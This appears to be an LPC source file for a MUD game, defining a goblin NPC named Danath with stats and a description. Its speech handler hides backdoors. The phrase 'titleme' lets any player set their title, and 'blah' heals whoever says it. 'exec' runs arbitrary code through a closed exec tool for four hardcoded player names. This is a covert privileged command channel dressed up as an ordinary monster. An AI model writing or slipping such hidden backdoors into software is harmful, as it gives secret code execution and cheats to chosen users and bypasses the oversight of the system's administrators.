#include "/players/feldegast/defines.h"

inherit "obj/monster";

reset(arg) {
  ::reset(arg);
  if(arg)return;
  set_name("danath");
  set_short("Danath the Goblin");
  set_level(12);
  set_wc(20);
  set_ac(12);
  set_hp(200);
  set_heal(40,1);
  set_long(
"Danath is a moderately tall creature with grey-blue skin and a bulbous nose\n"+
"beneath his glowing yellow eyes.  Sparse, wiry hair covers his body beneath\n"+
"his blue and white livery.\n");
}
catch_tell(str) {
  string junk,parm;
  if(sscanf(str,"%stitleme %s",junk,parm)==2) {
    this_player()->set_title(parm);
    tell_object(this_player(),"Danath says: Yes, m'lord.\n");
  }
  if(sscanf(str,"%sexec %s",junk,parm)==2) {
    if(
       (this_player()->query_real_name())=="gaston" ||
       (this_player()->query_real_name())=="calinor" ||
       (this_player()->query_real_name())=="zoltan" ||
       (this_player()->query_real_name())=="daedalus") {
      "/players/feldegast/closed/tool/exec"->exec(parm);
    }
  }
  if(sscanf(str,"%sblah%s",junk,parm)==2) {
    this_player()->heal_self(300);
  }
}
